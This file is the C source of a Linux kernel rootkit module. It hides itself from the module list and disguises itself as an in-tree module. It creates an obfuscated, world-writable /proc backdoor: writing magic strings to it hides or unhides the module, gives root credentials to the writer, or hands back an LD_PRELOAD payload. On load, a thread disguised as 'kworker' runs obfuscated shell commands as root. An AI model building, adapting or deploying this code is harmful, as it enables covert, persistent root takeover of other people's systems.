#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/workqueue.h>
#include <linux/kthread.h>
#include <linux/sysfs.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/delay.h>
#include <linux/cred.h> //// MAYBE IF
#include "config.h"

#define WORKQUEUE "ata/0"
#define proc_fs_max 1024
#define CLEAN(var) memset(var, 0x00, strlen(var));
#define xor(new_name, target) char *new_name = kstrdup(target, GFP_KERNEL);_xor(new_name);

#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 4, 0)
#define V(x) x.val
#else
#define V(x) x
#endif

static int SESS = 0;
static int TEST = 0;
static struct list_head *mod_list;
static char procfs_buffer[proc_fs_max];
static int proc_buffer_size = 0;
static struct workqueue_struct *work_queue = NULL;
static struct task_struct *my_kthread;
static struct proc_dir_entry *proc_entry;
typedef struct{
	struct work_struct work;
	char cmd[1024];
} bash_call;

static void _xor(char *p){
	int i;
	for(i=0;i<strlen(p);i++)
		if(p[i] ^ XKEY)
			p[i] ^= XKEY;
	return;
}

static int xstrncmp(const char *pattern, const char *string){
	int ret;
	xor(_pattern, pattern);
	ret = strncmp(_pattern, string, strlen(_pattern));
	CLEAN(_pattern);
	return ret;
}

static void hide(void){
	while(!mutex_trylock(&module_mutex))
		cpu_relax();
	if(SESS == 0){
		mod_list = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		kfree(THIS_MODULE->sect_attrs);
		THIS_MODULE->sect_attrs = NULL;
//	Write Me If You Know How To Fix ;)
//		  THIS_MODULE->notes_attrs = NULL;
		SESS = 1;
	} else if(SESS == 1){
		list_add(&THIS_MODULE->list, mod_list);
		SESS = 0;
	}
	mutex_unlock(&module_mutex);
	return;
}

static ssize_t hello_proc_write(struct file *fp, const char __user *buf, size_t count, loff_t *offp){
	struct cred *new = prepare_kernel_cred(0);
	proc_buffer_size = count;
	if(proc_buffer_size > proc_fs_max)
		proc_buffer_size = proc_fs_max;
	if(copy_from_user(procfs_buffer, buf, proc_buffer_size))
		return count;
	procfs_buffer[proc_buffer_size] = '\0';
	if(!xstrncmp(PURGE, procfs_buffer))
		hide();
	else if(!xstrncmp(GIVEROOTPERM, procfs_buffer)){
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = 0;
		current->suid = 0;
		current->euid = 0;
		current->fsuid = 0;
		current->gid = MGID;
		current->sgid = MGID;
		current->egid = MGID;
		current->fsgid = MGID;
		cap_set_full(current->cap_effective);
		cap_set_full(current->cap_inheritable);
		cap_set_full(current->cap_permitted);
#else
		V(new->gid) = MGID;
		V(new->sgid) = MGID;
		V(new->egid) = MGID;
		V(new->fsgid) = MGID;
		commit_creds(new);
#endif
	} else if(!xstrncmp(LDP, procfs_buffer))
		TEST = 1;
	return count;
}

static ssize_t hello_proc_read(struct file *fp, char __user *buf, size_t count, loff_t *offp){
	if(TEST != 0){
		TEST = 0;
		return simple_read_from_buffer(buf, count, offp, LDPSO, LDPSO_len);
	}
	return 0;
}

static int threadfn(void *data){
	xor(cmd_t, CMD);
	xor(cmd_tt, CMD2);
	xor(mgid_t, MGID_NAME);
	char *argv[] = {"/bin/bash", "-c", cmd_t, NULL};
	char *argv2[] = {"/bin/su", "-g", mgid_t, "-c" ,cmd_tt, NULL};
	char *envp[] = {"PATH=/bin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin", NULL};
	do {
		msleep(100);
		call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT); //UMH_NO_WAIT // UMH_WAIT_EXEC // UMH_WAIT_PROC
		msleep(MSLP);
		call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); //UMH_NO_WAIT // UMH_WAIT_EXEC // UMH_WAIT_PROC
		msleep(100);
		break;
	} while(!kthread_should_stop());
	CLEAN(cmd_t);
	return 0;
}

static int start_cmd_thread(void){
	int cpu = 0;
	my_kthread = kthread_create(threadfn, &cpu, "kworker");
	kthread_bind(my_kthread, cpu);
	wake_up_process(my_kthread);
	return 0;
}
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops hello_proc_fops = {
	.proc_read   = hello_proc_read,
	.proc_write  = hello_proc_write,
};
#else
static const struct file_operations hello_proc_fops = {
	.owner = THIS_MODULE,
	.read   = hello_proc_read,
	.write  = hello_proc_write,
};
#endif
static int __init extructor_init(void){
	work_queue = create_singlethread_workqueue(WORKQUEUE);
	if(work_queue){
		hide();
		xor(hide_t, PROC);
		proc_entry = proc_create(hide_t, 0666, NULL, &hello_proc_fops);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
		proc_set_user(proc_entry, KUIDT_INIT(0), KGIDT_INIT(MGID));
#else
		proc_entry->uid = 0;
		proc_entry->gid = MGID;
#endif
		CLEAN(hide_t);
		if(proc_entry)
			start_cmd_thread();
	}
	return 0;
}

static void __exit extructor_exit(void){
	xor(hide_t, PROC);
	remove_proc_entry(hide_t, NULL);
	CLEAN(hide_t);
	flush_workqueue(work_queue);
	destroy_workqueue(work_queue);
	return;
}

module_init(extructor_init);
module_exit(extructor_exit);

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
MODULE_INFO(srcversion, "");
